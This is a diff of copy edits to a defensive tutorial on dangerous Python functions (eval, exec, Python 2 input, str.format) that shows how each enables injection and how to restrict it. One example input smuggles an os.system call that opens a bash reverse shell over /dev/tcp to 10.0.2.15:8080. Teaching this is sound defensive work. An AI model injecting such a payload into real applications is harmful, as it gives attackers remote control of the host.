@@ -5,7 +5,7 @@ Python has become immensely useful in Cyber Security as it supports and performs
 
 In this tutorial, I will help you avoid those mistakes.
 
-![](https://media.giphy.com/media/3oKIPcqmx1mpCOJJp6/giphy.gif)
+![We are in GIF](https://media.giphy.com/media/3oKIPcqmx1mpCOJJp6/giphy.gif)
 
 ### Dangerous functions
 Some functions can be dangerous by performing a sort of code injection and an authentication bypass. Let's be in the hacker's shoes, think like him, and learn how to protect our code.
@@ -37,15 +37,16 @@ If we pass `{"x":"2", "y":"4"}` as our previous code, then the result will be `6
 {"x":"__import__('os').system('bash -i >& /dev/tcp/10.0.2.15/8080 0>&1')#", "y":"4"}
 ```
 
-This malicious code will force our calculator to call `os.system` then spawn a reverse shell to the IP "10.0.2.15" on PORT "8080".
+This malicious code will force our calculator to call `os.system` then spawn a [reverse shell](https://www.sans.edu/student-files/presentations/LVReverseShell.pdf) to the IP "10.0.2.15" on PORT "8080".
 
 #### Exec()
-This function is just like `Eval()` which executes a string or a code object. You have just to replace the second line of our last code with:
+This function is similar to `eval()` which executes a string or a code object:
 ```python
-return exec("%s + %s" % (x, y))
+code = 'x = 2\ny=4\nprint("result =", x+y)'
+exec(code)
 ```
 
-And you can exploit it in the same way as we did before.
+The output will be `6`. And you can exploit it in the same way as we did before.
 
 Now if you want to use those functions, you have to check which methods and variables the user is allowed to use by:
 ```python
@@ -85,7 +86,7 @@ If you want to provide a specific method along with the __builtins__ then you ne
 from math import *
 exec('print(dir())', {'squareroot': sqrt})
 
-exec('print(squareroot(16))', {'squareRoot': sqrt})
+exec('print(squareroot(16))', {'squareroot': sqrt})
 ```
 
 This will give the user the ability to execute the `sqrt` method by using `squareroot()`. However, if he tries to use `sqrt()` then it will raise an exception.
@@ -97,19 +98,19 @@ The output here is:
 ```
 
 #### Input()
-You can find this vulnerability only in [Python 2](https://www.python.org/downloads/release/python-272/) and you can't find it in [Python 3](https://www.python.org/downloads/).
+You can find this vulnerability only in [Python 2](https://www.python.org/downloads/release/python-272/), not in [Python 3](https://www.python.org/downloads/).
 
 This function in Python 2 takes the value type, as it is without changing its type. 
 ```python
 secret = 5
-number = input("Expect the secret number")
+number = input("Guess the secret number")
 if number==secret:
     print("YES")
 else:
     print("NO")
 ```
 
-Now we have a secret number, and we want the user to expect it. If we pass `5` then the result will be `YES` and otherwise it will be `NO`, but if we pass `secret` then the result will be `YES` because the Python conditional now is:
+Now we have a secret number, and we want the user to guess it. If we pass `5` then the result will be `YES` and otherwise it will be `NO`, but if we pass `secret` then the result will be `YES` because the Python conditional now is:
 ```python
 if secret==secret: // This will be true
 ```
@@ -163,11 +164,11 @@ Then our sensitive information will be compromised and the output will be:
 That happened because the string formatting function has the ability to access attributes objects. And the question now, is it still good to use `str.format()`? Yes, but you have to be aware that it becomes vulnerable when it is used over user-controlled strings.
 
 ### Conclusion 
-We learned about the dangerous functions `eval()`, `exec()` ,and `input()`, how hackers can use them to hack your Python code, and finally, how to protect yourself against them. But anyway, you have to pay an attention to vulnerabilities besides the language-specific ones, like [XSS](https://owasp.org/www-community/attacks/xss/), [SQL injection](https://www.w3schools.com/sql/sql_injection.asp), etc...
+We learned about the dangerous functions `eval()`, `exec()`, and `input()`, how hackers can use them to hack your Python code, and finally, how to protect yourself against them. But anyway, you have to pay attention to vulnerabilities besides the language-specific ones, like [XSS](https://owasp.org/www-community/attacks/xss/), [SQL injection](https://www.w3schools.com/sql/sql_injection.asp), etc...
 
 Till next time, happy coding Pythonistas!
 
-![](https://media.giphy.com/media/LmNwrBhejkK9EFP504/giphy.gif)
+![Cat coding GIF](https://media.giphy.com/media/LmNwrBhejkK9EFP504/giphy.gif)
 
 ### Further reading
 1. [Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
